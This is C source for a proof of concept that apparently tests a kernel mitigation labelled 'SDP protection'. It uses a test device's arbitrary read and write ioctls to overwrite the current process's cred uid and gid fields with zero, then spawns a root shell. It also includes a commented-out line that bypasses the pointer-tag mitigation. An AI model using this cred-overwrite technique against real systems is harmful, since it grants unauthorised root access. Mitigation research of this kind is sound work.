// FZY: Add a simple proof of concept that overwrites the cred struct to get root privileges

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_GET_CURRENT_TASK _IOR('A', 8, unsigned long)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

int main(int argc, char *argv[]) {
  printf("[+] cred Privilege Escalation PoC\n\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <cred_offset>\n", argv[0]);
    printf("  mode: 0 (no protection), 1/2 (SDP protection)\n");
    printf("  cred_offset: offset of cred pointer in task_struct\n");
    printf("               pahole -C task_struct vmlinux | grep -A1 'const "
           "struct cred.*cred'\n");
    return 1;
  }

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw\n");

  int mode = atoi(argv[1]);
  unsigned long cred_offset = strtoul(argv[2], NULL, 0);

  // Step 1: Get current task_struct address
  unsigned long task_addr;
  if (ioctl(fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
    perror("ARB_GET_CURRENT_TASK");
    close(fd);
    return 1;
  }
  printf("[+] Current task_struct address: 0x%lx\n", task_addr);

  // Step 2: Read the cred pointer from task_struct
  unsigned long cred_ptr_addr = task_addr + cred_offset;
  unsigned long cred_addr;
  arb_read(fd, cred_ptr_addr, &cred_addr, sizeof(cred_addr));
  printf("[+] cred pointer at task_struct+%lu: 0x%lx\n", cred_offset,
         cred_addr);

  if (mode != 0) {
    printf("[+] SDP mode %d: cred pointer (tagged): 0x%lx\n", mode, cred_addr);
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // cred_addr = cred_addr | 0xFFFF000000000000;
  }

  // Step 3: Read original uid/gid values from cred
  // struct cred layout (from pahole, no CONFIG_DEBUG_CREDENTIALS):
  //   +0:  atomic_t usage (4 bytes)
  //   +4:  uid  (4)    +8:  gid  (4)
  //   +12: suid (4)    +16: sgid (4)
  //   +20: euid (4)    +24: egid (4)
  //   +28: fsuid(4)    +32: fsgid(4)
  #define CRED_UID_OFFSET 4  // offset of uid within struct cred

  unsigned int orig_uid;
  arb_read(fd, cred_addr + CRED_UID_OFFSET, &orig_uid, sizeof(orig_uid));
  printf("[+] uid at cred+%d: %u\n", CRED_UID_OFFSET, orig_uid);
  printf("[+] Current UID: %d, EUID: %d\n", getuid(), geteuid());

  // Step 4: Overwrite uid, gid, suid, sgid, euid, egid, fsuid, fsgid to 0 (root)
  // 8 consecutive 32-bit fields = 32 bytes starting at offset 4
  unsigned char zeros[32];
  memset(zeros, 0, sizeof(zeros));

  printf("\n[+] Overwriting uid/gid/suid/sgid/euid/egid/fsuid/fsgid to 0 (root)...\n");
  arb_write(fd, cred_addr + CRED_UID_OFFSET, zeros, sizeof(zeros));

  // Step 5: Verify the overwrite
  unsigned int new_uid;
  arb_read(fd, cred_addr + CRED_UID_OFFSET, &new_uid, sizeof(new_uid));
  printf("[+] New uid value in cred: %u\n", new_uid);

  printf("[+] Current UID: %d, EUID: %d\n", getuid(), geteuid());

  if (getuid() == 0) {
    printf("\n[+] === PRIVILEGE ESCALATION SUCCESS ===\n");
    printf("[+] We are now root! Spawning a shell...\n");
    execl("/bin/sh", "sh", NULL);
  } else {
    printf("\n[-] Privilege escalation failed (uid=%d)\n", getuid());
  }

  close(fd);
  return 0;
}
